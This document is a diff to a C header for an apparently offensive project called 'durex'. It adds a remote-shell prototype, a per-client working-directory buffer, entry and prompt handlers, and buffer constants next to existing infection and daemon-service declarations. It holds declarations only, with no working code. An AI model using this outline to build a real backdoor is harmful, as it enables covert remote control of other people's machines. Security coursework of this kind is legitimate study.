@@ -24,6 +24,7 @@
 #include <dirent.h>
 #include <netinet/in.h>
 #include <pthread.h>
+#include <signal.h>
 
 /*
 **	INTERNAL INCLUDES
@@ -40,8 +41,11 @@
 # define CLIENT_BUFFER		4096
 # define PASSWORD_LEN		512
 # define SERVICE_RAW_LEN	1024
-# define LIBRARY_RAW_LEN	30000
+# define LIBRARY_RAW_LEN	35000
 # define BUFFER_LEN			1024
+# define ENTRY_BUFFER		102400
+# define PWD_CLIENT			4096
+
 /*
 **	Environments variables struct
 */
@@ -81,6 +85,7 @@ typedef struct		s_durex
 */
 typedef struct		s_client
 {
+	char			pwd[PWD_CLIENT];
 	t_durex			*durex;
 	SOCKET			socket;
 }					t_client;
@@ -101,10 +106,11 @@ void					get_durex_content(t_durex*);
 /*
 **	UTILS
 */
-int						get_random(int low, int high);
-int						get_file_length(char *path);
+int						get_random(int, int);
+int						get_file_length(char*);
 char					*get_current_path();
-char					*clear_buffer(char *buffer);
+bool					clear_buffer(char*);
+bool					path_exist(char*);
 
 /*
 **	INFECTION
@@ -145,4 +151,21 @@ void					init_daemon_service(t_durex*);
 **	DUREX
 */
 void					init_library(t_durex*);
+
+/*
+**	ENTRY
+*/
+void					entry_handler(t_client*, char*, bool);
+void					print_prompt(t_client*, bool);
+
+/*
+**	SHELL
+*/
+void					remote_shell(t_client*);
+
+/*
+**	CHDIR
+*/
+bool					handle_chdir(t_client*, char*);
+
 #endif
